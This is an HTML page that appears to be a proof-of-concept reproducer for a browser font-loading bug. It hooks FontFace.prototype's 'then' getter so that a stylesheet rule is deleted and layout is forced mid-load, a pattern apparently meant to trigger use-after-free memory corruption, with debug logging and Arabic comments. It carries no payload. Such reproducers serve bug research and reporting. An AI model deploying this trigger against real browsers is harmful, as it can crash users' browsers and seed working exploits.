<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: 'x'; src: url(nonexistent.woff); unicode-range: U+0042; }
    </style>
</head>
<body>
    <div id="debug" style="color: #0f0; font-family: monospace; font-size: 18px; white-space: pre-wrap;">
        [1] Script Starting...
    </div>

    <script>
        const debug = document.getElementById('debug');
        
        function log(msg) {
            debug.innerText += "\n[+] " + msg;
        }

        window.onload = () => {
            try {
                log("Script Loaded.");
                
                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
                document.fonts.add(A);
                log("FontFace added to document.fonts.");

                let fired = false;
                
                // تشخيص الـ Hook
                Object.defineProperty(FontFace.prototype, 'then', {
                    configurable: true,
                    get() {
                        if (!fired && this === A) {
                            fired = true;
                            log("HOOK TRIGGERED! (Object detected)");
                            
                            // الحذف
                            document.getElementById('s').sheet.deleteRule(0);
                            log("Rule deleted.");
                            
                            document.body.offsetTop;
                            log("Layout forced.");
                        }
                        return undefined;
                    }
                });
                log("Hook applied to prototype.");

                log("Calling fonts.load...");
                document.fonts.load('1em x', 'AB').then(() => {
                    log("Load completed.");
                }).catch((e) => {
                    log("Load caught error: " + e.message);
                });

            } catch (err) {
                log("CRITICAL ERROR: " + err.message);
            }
        };
    </script>
</body>
</html>
